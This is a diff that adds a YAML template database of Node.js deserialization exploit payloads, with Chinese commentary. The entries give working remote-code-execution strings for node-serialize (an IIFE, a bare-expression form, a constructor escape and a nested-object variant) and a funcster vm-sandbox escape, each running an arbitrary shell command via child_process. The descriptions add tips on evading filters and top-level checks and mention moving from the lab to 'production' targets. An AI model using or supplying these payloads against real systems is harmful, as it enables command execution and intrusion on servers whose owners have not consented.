@@ -1,0 +1,107 @@
+ruleDB: v0.1.0
+# Node.js 反序列化模板。载荷是 JSON，所以有可靠 parser。
+
+templates:
+  - id: deser.node.serialize.rce
+    name: node-serialize 立即执行函数
+    desc: node-serialize 反序列化时会对 _$$ND_FUNC$$_ 开头的字符串调 eval
+    vuln: [deser]
+    content_type: [json]
+    component: [node-serialize]
+    version: "*"
+    body: |-
+      {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('<<cmd>>')}()"}
+    vars: [cmd]
+    requires: [deser-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.node.serialize.constructor
+    name: node-serialize 经 constructor 逃逸
+    desc: >-
+      与 serialize.rce 同为 node-serialize 的载荷（标记都是 _$$ND_FUNC$$_），
+      区别是函数体先经 this.constructor.constructor 拿回宿主 Function 构造器再取
+      process——目标把 require 从作用域里摘掉时用这条。
+      **注意它和 funcster 是两回事**：funcster 的标记是 __js_function，
+      写成 _$$ND_FUNC$$_ 不会报错、只会静默不执行（那条见 funcster.deep）。
+    vuln: [deser]
+    content_type: [json]
+    component: [node-serialize]
+    version: "*"
+    body: |-
+      {"rce":"_$$ND_FUNC$$_function(){return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('<<cmd>>').toString()}()"}
+    vars: [cmd]
+    requires: [deser-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- node-serialize 的另外两种形态 ----
+  # 它的 unserialize 对 _$$ND_FUNC$$_ 开头的字符串做的是
+  # `obj[key] = eval('(' + 去掉标记后的内容 + ')')`——**求的是表达式，不是函数**，
+  # 所以下面两条都成立：一条不给函数包装，一条换个位置。
+
+  - id: deser.node.serialize.expr
+    name: node-serialize 裸表达式
+    desc: >-
+      标记后面直接写表达式，不必包成 function(){}()：eval 会把它求值并把结果赋回
+      那个键。过滤器只拦 function、require 这些字样时换个写法（process.mainModule
+      也一样能拿到 require）。原来那条 rce 用 exec 不取回显，这条 execSync 会把
+      输出放进返回值，页面有回显位时能直接看到结果。
+    vuln: [deser]
+    content_type: [json]
+    component: [node-serialize]
+    version: "*"
+    body: |-
+      {"rce":"_$$ND_FUNC$$_process.mainModule.require('child_process').execSync('<<cmd>>').toString()"}
+    vars: [cmd]
+    requires: [deser-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.node.serialize.nested
+    name: node-serialize 载荷嵌在子对象里
+    desc: >-
+      同样的载荷，只是塞进子对象（也适用于数组元素）。unserialize 是递归的，
+      而很多过滤只扫 JSON 顶层那个字符串——顶层看起来是个普通对象就放过去了。
+      目标对 _$$ND_FUNC$$_ 做了顶层检查时换这条。
+    vuln: [deser]
+    content_type: [json]
+    component: [node-serialize]
+    version: "*"
+    slots:
+      key: {options: ["data", "value", "payload", "config", "options"], default: "data"}
+    body: |-
+      {"<<key>>":{"<<key>>":"_$$ND_FUNC$$_function(){require('child_process').execSync('<<cmd>>')}()"}}
+    vars: [cmd]
+    requires: [deser-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.node.funcster.deep
+    name: funcster 标记与沙箱
+    desc: >-
+      funcster 的标记是 **__js_function**（不是 node-serialize 的 _$$ND_FUNC$$_，
+      两者写混了不会报错、只是静默不执行）。它在 vm.runInNewContext 开的新上下文里
+      求值：process 和 require 默认都取不到，得靠 this.constructor.constructor
+      回到宿主的 Function 构造器。Node 的 vm 从来不是安全边界，但能不能逃出来
+      随版本变，先在实验室确认再上生产。
+    vuln: [deser]
+    content_type: [json]
+    component: [funcster]
+    version: "*"
+    body: |-
+      {"rce":{"__js_function":"function(){return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('<<cmd>>').toString()}"}}
+    vars: [cmd]
+    requires: [deser-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
